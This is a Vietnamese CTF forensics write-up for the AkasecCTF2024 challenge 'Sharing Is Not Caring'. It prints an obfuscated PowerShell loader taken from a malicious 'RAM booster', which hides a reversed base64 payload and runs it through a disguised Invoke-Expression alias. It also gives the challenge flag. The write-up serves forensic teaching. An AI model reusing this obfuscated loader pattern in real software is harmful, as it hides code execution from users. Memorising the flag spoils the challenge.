# Sharing Is Not Caring

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/d168bbd7-f05b-4104-9e36-b2c4de681796)

## Windows Forensics && Network Forensics

* file:
  * disk.ad1
  * network.pcapng

## Tools

* Wireshark
* FTK Imager
* IDA

## Overview

* Nhiều người dùng sử dụng một folder có thể truy cập ở bất cứ tài khoản nào và một người dùng đã tải một file thực thi mã độc đánh cắp file SSL key để giải mã TLS và đọc được dữ liệu gửi đi qua các giao thức HTTP2 

## Analysis

* mình search được từ [web](https://answers.microsoft.com/en-us/windows/forum/all/sharing-folders-across-local-users-on-one-pc-in/91a33d05-29eb-499c-9f7a-8e1db89e7f57)

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/7de0829b-dc01-43e1-b326-574c433efefd)

* sử dụng FTK Imager phân tích file ad1

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/29f7dc78-2999-4de4-aa22-8443e94c232f)

* tại C:\Users\Public\Documents mình đã thấy có một file txt thông báo cho mọi người tải file gì đó từ link để boost ram

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/2c00d011-f8e6-4c8d-a0c0-b38ab04384bc)

* sau khi tải file này xuống, sử dụng IDA để phân tích file

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/f27ca3d0-2d86-4f22-8b6f-f7ee1a72364e)

* có một đoạn code powershell được ẩn giấu ở trong file này

```
$best64code = \"iQWZ0N3bvJGIlJGIuF2Yg0WYyBybuBiLlV3czlGIsF2Yp5GajVGdgI3bmBSeyJ3bzJCIy9mcyVULlRXaydlCNoQDpcSZulGajFWTnACLlxWaGd2bMlXZLx2czRCIscSRMlkRH9ETZV0SMN1UngSZsJWYpJXYWRnbl1mbvJXa25WR0V2U6oTX05WZt52bylmduVkLtVGdzl3UbpQDK0QfK0QZslmRgUGc5RVblRXStASZslmRn9GT5V2SsN3ckACa0FGUtASblRXStcXZOBCIgAiCNsHIpkSZslmRn9GT5V2SsN3ckACa0FGUtQ3clRFKgQ3bu1CKgYWaK0gCNoQDic2bs5SeltGbzNHXr5WacBVVOdUSTxlclJ3bsBHeFBCdl5mclRnbJx1c05WZtV3YvREXjlGbiVHUcNnclNXVcpzQiASPgUGbpZ0ZvxUeltEbzNHJ\" ;\r\n$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;\r\n$LOADCode = [System.text.EnCOdING]::UTF8.getsTRiNg([sysTEm.coNvErT]::FromBASe64stRInG(\"$BaSe64\")) ;\r\n$PWN = \"Inv\"+\"Oke\"+\"-ex\"+\"prE\"+\"SsI\"+\"ON\" ; nEW-aLIas -naMe PWN -ValuE $pWN -foRce ; pwn $lOadCODe ;\r\n
```

* đoạn base64 ở trong đã bị reverse và encode base64, dịch ngược để ra đoạn code ban đầu

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/6c3c6ad8-78b8-4ce5-b45a-9d416f4d3fa2)

* theo đường dẫn và tìm được file sslkey.log
* trở về với file pcapng và giải mã các packet tls bằng sslkey.log

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/33043ade-d3bd-456e-9f0a-fd7ee9187cbe)

* filter http2 và tìm string AKASEC

![ảnh](https://github.com/LDV-SpaceK/AkasecCTF2024/assets/151914246/0781f711-8c7e-429f-84bc-d29287c2b0c0)

`AKASEC{B4s1c_M4lw4r3_4nd_PC4P_4n4lys1s}`



